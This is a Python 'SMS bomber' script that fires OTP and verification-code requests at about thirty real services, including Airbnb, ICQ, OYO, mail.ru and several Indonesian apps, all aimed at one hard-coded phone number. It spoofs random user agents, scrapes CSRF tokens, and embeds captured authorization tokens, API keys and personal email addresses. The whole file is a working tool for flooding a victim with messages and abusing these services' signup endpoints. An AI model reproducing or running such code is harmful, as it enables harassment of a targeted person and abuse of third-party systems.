from fake_useragent import UserAgent
import requests as ru
import threading, os, sys, json, time
from bs4 import BeautifulSoup as bs

class main:
    def main():
        nomer="82324807968"
        print(nomer)
        spam.piza(nomer)
        spam.map(nomer)
        spam.icq(nomer)
        spam.adakami(nomer)
        spam.coowry(nomer)
        spam.iuga(nomer)
        spam.fav(nomer)
        spam.suplai(nomer)
        spam.depop(nomer)
        spam.dekoruma(nomer)
        spam.jag(nomer)
        spam.airbnb(nomer)
        # spam.kelaspintar(nomer)
        spam.payfazz(nomer)
        spam.alodokter(nomer)
        spam.prosehat(nomer)
        spam.theharvest(nomer)
        spam.danacinta(nomer)
        spam.redbus(nomer)
        # spam.olx(nomer)
        spam.rupiahcepat(nomer)
        # spam.matahari(nomer)
        spam.iviru(nomer)
        spam.beltelecom(nomer)
        spam.mailru(nomer)
        spam.youla(nomer)
        spam.oyo(nomer)
        # spam.jenius(nomer)
        # spam.vadershop(nomer)

class spam:
 def piza(nom):
    hd = {
    'user-agent': UserAgent().random ,
    'referer': 'https://www.phd.co.id/register',
    'Host': 'api-prod.diqit.io',
    'content-type':'application/json;charset=UTF-8',
    }
    dat = {'phone':nom}
    ru.post("https://api-prod.diqit.io/customer/v1/customer/register", headers=hd, json=dat)
 def map(nom):
    hd = {
    "Connection": "keep-alive",
    "user-agent": UserAgent().random ,
    }
    dat = {'phone':'62'+nom}
    ru.post("https://cmsapi.mapclub.com/api/signup-otp",data=dat,headers=hd)
 def icq(nom):
    url = 'https://u.icq.net/api/v14/rapi/auth/sendCode'
    hd = {
    "accept": "*/*",
    "accept-language": "en-US,en;q=0.9,id;q=0.8,mt;q=0.7",
    "content-type": "application/json",
    "origin": "http://web.icq.com",
    "referer": "http://web.icq.com/",
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "cross-site",
    "user-agent": UserAgent().random ,
    }
    dat = json.dumps({"reqId":"64708-1593781791","params":{"phone":"62"+nom,"language":"en-US","route":"sms","devId":"ic1rtwz1s1Hj1O0r","application":"icq"}})
    a = ru.post(url,headers=hd,data=dat).text
 def adakami(nom):
    hd = {
        "content-type": "application/json; charset=UTF-8",
        "content-length": "34",
        "accept-encoding": "gzip",
        "user-agent": "okhttp/3.8.0",
        "accept-language": "in",
        "x-ada-token": "",
        "x-ada-appid": "800006",
        "x-ada-os": "android",
        "x-ada-channel": "default",
        "x-ada-mediasource": "",
        "x-ada-agency": "adtubeagency",
        "x-ada-campaign": "AdakamiCampaign",
        "x-ada-role": "1",
        "x-ada-appversion": "1.7.0",                                                                         "x-ada-device": "",
        "x-ada-model": "SM-G935FD",
        "x-ada-os-ver": "7.1.1",                                                                             "x-ada-androidid": "a4341a2sa90a4d97",
        "x-ada-aid": "c7bbb23d-a220-4d43-9caf-153608f9bd39",
        "x-ada-afid": "1580054114839-7395423911531673296",
    }
    dat = {"ketik":0,"nomor":"0"+nom}
    datjson = json.dumps(dat)
    r = ru.Session()
    r.post("https://api.adakami.id/adaKredit/pesan/kodeVerifikasi",data=datjson,headers=hd,timeout=10).text

 def coowry(nom):
    url = 'https://www.coowry.com/arlethdesign'
    spam = 'https://www.coowry.com/api/tokens'
    hd = {
        "accept": "*/*",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
        "content-length": "28",
        "content-type": "application/json",
        "origin": "https://www.coowry.com",
        "referer": "https://www.coowry.com/arlethdesign",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": UserAgent().random
    }
    target = {"msisdn":"+62"+nom}
    jsn = json.dumps(target)
    r  = ru.Session()
    a = r.get(url,headers={'user-agent':UserAgent().random}).cookies
    b = r.post(spam,headers=hd,cookies={'_cwpeople_keyle_key':a["_cwpeople_key"]},data=jsn).text
    c = json.loads(b)["type"]
 def iuga(nom):
    pis = nom.replace("+62","")
    r  = ru.Session()
    for x in range(1):
        a = r.get('https://www.iuiga.com/register.html',headers={'user-agent':UserAgent().random}).text
        b = bs(a,'html.parser')
        c = b.find("meta",attrs={"name":"csrf-token"})
        d = r.post('https://www.iuiga.com/login/send-register-code',headers={'user-agent':UserAgent().random},data={"_csrf": c["content"],"phone": pis,"phone_code": "+62","is_login": "0"}).text

 def fav(nom):
    hd = {
        "Host": "api.myfave.com",
        "Connection": "keep-alive",
        "x-user-agent": "Fave-PWA/v1.0.0",
        "User-Agent": UserAgent().random,
        "content-type": "application/json",
        "Accept": "*/*",
        "Origin": "https://m.myfave.com",
        "Referer": "https://m.myfave.com/jakarta/auth",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
    }
    dat = {'phone':'62'+nom}
    x = ru.post("https://api.myfave.com/api/fave/v3/auth", data=json.dumps(dat), headers=hd).text
 def suplai(nom):
    hd = {
        "Host": "api.sooplai.com",
        "accept": "application/json, text/plain, */*",
        "User-Agent": UserAgent().random ,
        "Content-Type": "application/json",
        "origin": "https://www.sooplai.com",
        "referer": "https://www.sooplai.com/register",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
    }
    dat = json.dumps({'phone':'62'+nom})
    ru.post("https://api.sooplai.com/customer/register/otp/request", data=dat, headers=hd)
 def chataja(nom):
     data = json.dumps({"user":{"app_id":"kiwari-prod","phone_number":"62"+nom}})
     a = ru.post('https://api.chataja.co.id/api/v2/auth_nonce',data=data,headers={"Accept": "application/json, text/plain, */*","Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","Connection": "keep-alive","Content-Length": "65","Content-Type": "application/json;charset=UTF-8","Host": "api.chataja.co.id","Origin": "https://web.chataja.co.id","Referer": "https://web.chataja.co.id/","Sec-Fetch-Dest": "empty","Sec-Fetch-Mode": "cors","Sec-Fetch-Site": "same-site","User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36"}).text;b = json.loads(a)["data"]
 def depop(nom):
     hd = {'Host':'webapi.depop.com','content-length':'49','accept':'application/json, text/plain, */*','origin':'https://signup.depop.com','save-data':'on','user-agent':'Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36','content-type':'application/json'}
     dat = {'phone_number':nom,'country_code':'ID'}
     datjs = json.dumps(dat)
     y = ru.put("https://webapi.depop.com/api/auth/v1/verify/phone",headers=hd,data=datjs)
 def ruparupa(nom):
     url = 'https://wapi.ruparupa.com/auth/check-otp-auth'
     url2 = 'https://wapi.ruparupa.com/auth/generate-otp'
     hdurl = {
    'accept': 'application/json',
    'authorization': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1dWlkIjoiODZhM2Q0ZmEtZDE3Mi00NDkwLTllOTAtN2MyM2UyZjA1MDA0IiwiaWF0IjoxNTk3NjY3MTgzLCJpc3MiOiJ3YXBpLnJ1cGFydXBhIn0.QBFVwucPwKlxWc43abnzEgjbNFOMHXMsXd3EaYk4tyU',
    'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7&',
    'content-length': '88',
    'content-type': 'application/json',                                                                                                          'origin': 'https://m.ruparupa.com',
    'referer': 'https://m.ruparupa.com/my-account',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': UserAgent().random ,
    'user-platform': 'mobile',
    'x-company-name': 'odi',                                                                                                                     'x-frontend-type': 'mobile',
    }
     hdurl2 = {
    'accept': 'application/json',
    'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7&',
    'authorization': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1dWlkIjoiODZhM2Q0ZmEtZDE3Mi00NDkwLTllOTAtN2MyM2UyZjA1MDA0IiwiaWF0IjoxNTk3NjY3MTgzLCJpc3MiOiJ3YXBpLnJ1cGFydXBhIn0.QBFVwucPwKlxWc43abnzEgjbNFOMHXMsXd3EaYk4tyU',
    'content-length': '103',
    'content-type': 'application/json',
    'origin': 'https://ruparupa.com',
    'referer': 'https://ruparupa.com/verification?page=otp-choices',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': UserAgent().random ,
    'user-platform': 'mobile',
    'x-company-name': 'odi',
    'x-frontend-type': 'mobile',
    }
     dataurl = {"phone":"0"+nom,"email":"abilseno11@gmail.com","action":"register","password":""}
     dataurljson = json.dumps(dataurl)
     dataurl2 = {"phone":"0"+nom,"action":"register","channel":"chat","email":"","customer_id":"0","is_resend":0}                                    
     dataurl2json = json.dumps(dataurl2)
     a = ru.post(url,headers=hdurl,data=dataurljson).text
     b = ru.post(url2,headers=hdurl2,data=dataurl2json).text
     c = json.loads(b)
 def dekoruma(nom):
     data = json.dumps({"phoneNumber":"+62"+nom,"platform":"wa"})
     r = ru.Session()
     cal = r.post("https://auth.dekoruma.com/api/v1/register/request-otp-phone-number/?format=json",headers={"content-type": "application/json","user-agent":UserAgent().random},data=data).text
 def jag(nom):
     p = ru.get("https://id.jagreward.com/member/verify-mobile/"+nom)
 def airbnb(nom):
     head = {
        "Host": "www.airbnb.co.id",
        "content-length": "83",
        "device-memory": "2",
        "x-csrf-token": "V4$.airbnb.co.id$N_Kx2ju9iX8$gUBHaO73_UKCj4rDt2rHVNj7zvmZfOYgz38XKc9dzKw=",
        "x-csrf-without-token": "1",
        "user-agent": UserAgent().random ,
        "viewport-width": "360",
        "content-type": "application/json",
        "accept": "application/json, text/javascript, */*; q=0.01",
        "cache-control": "no-cache",
        "x-requested-with": "XMLHttpRequest",
        "origin": "https://www.airbnb.co.id",
        "referer": "https://www.airbnb.co.id/signup_login?redirect_url=/help",
        }
     dat = json.dumps({"phoneNumber": "62"+nom,"workFlow":"GLOBAL_SIGNUP_LOGIN","otpMethod":"TEXT"})
     cal = ru.post("https://www.airbnb.co.id/api/v2/phone_one_time_passwords?currency=US&key=d306zoyjsyarp7ifhu67rjxn52tv0t20&locale=id",data=dat,headers=head)

 def kelaspintar(nom):
     r = ru.Session()
     headers={
        'x-requested-with':'XMLHttpRequest',
        'User-Agent':UserAgent().random ,
        'Referer':'https://www.kelaspintar.id/',
     }
     dat = {
          "user_mobile":nom,
          "otp_type":"send_otp_reg",
          "mobile_code":"%2B62",
     }
     x = r.post('https://www.kelaspintar.id/user/otpverification',data=dat,headers=headers).text
 def payfazz(nom):
     hd = {'Host': 'api.payfazz.com', 'content-length': '17', 'accept': '*/*', 'origin': 'https://www.payfazz.com','user-agent': UserAgent().random, 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'referer': 'http://www.payfazz.com/register/BEN6ZF74XL', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
     r = ru.Session()
     a = r.post('https://api.payfazz.com/v2/phoneVerifications', headers=hd, data={'phone': '0'+nom})
 def alodokter(nom):
     r = ru.Session()
     r.headers.update({'referer':'https://www.alodokter.com/login-alodokter'})
     hy = r.get("https://www.alodokter.com/login-alodokter")
     tol = bs(hy.text,'html.parser')
     token=tol.find('meta',{'name':'csrf-token'})['content']
     hd = {
     'user-agent':UserAgent().random,
     'content-type':'application/json',
     'referer':'https://www.alodokter.com/login-alodokter',
     'accept':'application/json',
     'origin':'https://www.alodokter.com',
     'x-csrf-token':token
      }
     y = r.post("https://www.alodokter.com/login-with-phone-number",headers=hd,json={"user":{"phone":"0"+nom}})
 def prosehat(nom):
     head={
        'accept': 'application/json, text/javascript, */*; q=0.01',                                                                                  
        'origin': 'https://www.prosehat.com',                                                                                                        
        'x-requested-with': 'XMLHttpRequest',
        'user-agent': UserAgent().random,
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'referer': 'https://www.prosehat.com/akun',
     }
     dat={'phone_or_email':'0'+nom,'action':'ajaxverificationsend'}
     ng=ru.post('https://www.prosehat.com/wp-admin/admin-ajax.php',data=dat,headers=head)
 def theharvest(nom):
     hd = {
     'user-agent':UserAgent().random
     }
     dat = {
     'phone':nom
     }
     r = ru.Session()
     hyu = r.post("https://harvestcakes.com/register",headers=hd,data=dat)
 def danacinta(nom):
     hd = {'user-agent':UserAgent().random}

     yu = ru.get("https://api.danacita.co.id/users/send_otp/?mobile_phone=0"+nom, headers=hd)
     yu1 = json.loads(yu.text)
 def redbus(nom):
     kil = ru.get("https://m.redbus.id/api/getOtp?number="+nom+"&cc=62&whatsAppOpted=true").text
 def olx(nom):
     head = {
        "accept": "*/*",
        "x-newrelic-id": "VQMGU1ZVDxABU1lbBgMDUlI=",
        "x-panamera-fingerprint": "83b09e49653c37fb4dc38423d82d74d7#1597271158063",
        "user-agent": UserAgent().random ,
        "content-type": "application/json",
        }
     dat = json.dumps({
          "grantType": "retry",
          "method": "sms",
          "phone": "+62"+nom,
          "language": "id"
        })
     r = ru.Session()
     eek = r.post("https://www.olx.co.id/api/auth/authenticate",data=dat,headers=head).text
 def rupiahcepat(nom):
     hd = {
     "accept": "text/html, application/xhtml+xml, application/json, */*",
     "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
     "content-length": "166",
     "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
     "origin": "https://h5.rupiahcepatweb.com",
     "referer": "https://h5.rupiahcepatweb.com/dua2/pages/openPacket/openPacket.html?activityId=11&invite=200219190100215723",
     "sec-fetch-dest": "empty",
     "sec-fetch-mode": "cors",
     "sec-fetch-site": "same-site",
     "user-agent": UserAgent().random
     }
     url = 'https://apiservice.rupiahcepatweb.com/webapi/v1/request_login_register_auth_code'
     dit = {"mobile":"0"+nom,"noise":"1583590641573155574","request_time":"158359064157312","access_token":"11111"}
     dat = json.dumps(dit)
     r = ru.Session()
     a = r.post(url,headers=hd,data={"data":dat}).text
     b = json.loads(a)["code"]
 def matahari(nom):
     r = ru.Session()
     hd = {
        'Host':'thor.matahari.com',
        'content-length':'235',
        'modulecode':'MR',
        'origin':'https://www.matahari.com',
        'authorization':'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJtb2R1bGVDb2RlIjoiTVIiLCJ1c2VyVHlwZSI6IjEiLCJleHAiOjE1NDM2NjA5MDYsInVzZXJOYW1lIjoiS0Zpb2ViMWhveU9FRDBERWQiLCJ1c2VySWQiOiJwcm9kdWN0aW9uNDYxOTAyNjQ0NSIsImp0aSI6IjFmMjI3NzE5LTY4OTMtNDhjYy1iNmQzLWY2OTkzMWMzMDIwYSIsImlhdCI6MTU0MzY1NzMwNn0.6XdrUX9QzD0Ld2eOJep7QnSwVjfFyjq-v7P4w0lGG9M',
        'content-type':'application/json',
        'accept':'application/json, text/plain, */*',
        'clientid':'mds_mweb',
        'user-agent':UserAgent().random ,
        'sessionid':'1599562523019',
        'save-data':'on',
        'referer':'https://www.matahari.com/register',
        'accept-encoding':'gzip, deflate, br',
        'accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
     }
     dat = {"emailAddress":"abilseno11@gmail.com","firstName":"Bapak","lastName":"Gile","mobileNumber":"0"+nom,"mccCardNumber":"","password":"savagetro123","referralCode":"","dateOfBirth":"03-01-1999","gender":"Male","registrationType":"N"}
     datj = json.dumps(dat)
     yu = r.post("https://thor.matahari.com/MatahariMobileAPI/register",headers=hd,data=datj)
 def iviru(nom):
     r = ru.Session()
     hd = {'user-agent':UserAgent().random}
     dat = {'phone':'62'+nom}
     hlo = r.post("https://api.ivi.ru/mobileapi/user/register/phone/v6",headers=hd,data=dat)
 def beltelecom(nom):
     r = ru.Session()
     hd = {'user-agent':UserAgent().random}
     dat = {'phone':'62'+nom}
     ho = r.post("https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru",headers=hd,data=dat)
 def mailru(nom):
     r = ru.Session()
     hd = {
        'user-agent':UserAgent().random ,
        'Content-Type':'application/json',
    }
     dat = json.dumps({
        'phone':'62'+nom,
        'api':2,
        'email':'akuntesnuyul@gmail.com',
        'x-email':'akunnuyul64@gmail.com',
    })
     yu = r.post("https://cloud.mail.ru/api/v2/notify/applink",headers=hd,data=dat)
 def youla(nom):
     r = ru.Session()
     hd = {'user-agent':UserAgent().random}
     dat = {'phone':'62'+nom}
     yu = r.post("https://youla.ru/web-api/auth/request_code",headers=hd,data=dat)
 def oyo(nom):
     r = ru.Session()
     hd = {
        "Host": "identity-gateway.oyorooms.com",
        "consumer_host": "https://www.oyorooms.com",
        "accept-language": "id",
        "access_token": "SFI4TER1WVRTakRUenYtalpLb0w6VnhrNGVLUVlBTE5TcUFVZFpBSnc=",
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
        "Content-Type": "application/json",
        "accept": "*/*",
        "origin": "https://www.oyorooms.com",
        "referer": "https://www.oyorooms.com/login",
        "Accept-Encoding": "gzip, deflate, br",
     }
     dat=json.dumps({"phone":nom,"country_code":"+62","country_iso_code":"ID","nod":"4","send_otp":"true","devise_role":"Consumer_Guest"})
     y = r.post("https://identity-gateway.oyorooms.com/identity/api/v1/otp/generate_by_phone?locale=id",headers=hd,data=dat)
     y1 = json.loads(y.text)["otp_sent"]

 def jenius(nom):
     r = ru.Session()
     hd = {
     "accept": "*/*",
    "btpn-apikey": "f73eb34d-5bf3-42c5-b76e-271448c2e87d",
    "version": "2.36.1-7565",
    "accept-language": "id",
    "x-request-id": "d7ba0ec4-ebad-4afd-ab12-62ce331379be",
    "Content-Type": "application/json",
    "Host": "api.btpn.com",
    "Connection": "Keep-Alive",
    "Accept-Encoding": "gzip",
    "Cookie": "c6bc80518877dd97cd71fa6f90ea6a0a=24058b87eb5dac1ac1744de9babd1607",
    "User-Agent": "okhttp/3.12.1"
     }
     dat={"query":"mutation registerPhone($phone: String!, $language: Language!) {\n  registerPhone(input: {phone: $phone, language: $language}) {\n    authId\n    tokenId\n    __typename\n  }\n}\n","variables":{"phone":nom,"language":"id"},"operationName":"registerPhone"}
     udh = r.post("https://api.btpn.com/jenius",headers=hd,data=dat)
     print (udh.text)
 def vadershop(nom):
     r = ru.Session()
     hd = {'user-agent':'Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36'}
     dat = json.dumps(['62'+nom,'Vader Shop'])
     y = r.post("https://api.vader-api.com/account/sendmobilecodeasync.json",headers=hd,data=dat).text

main.main()
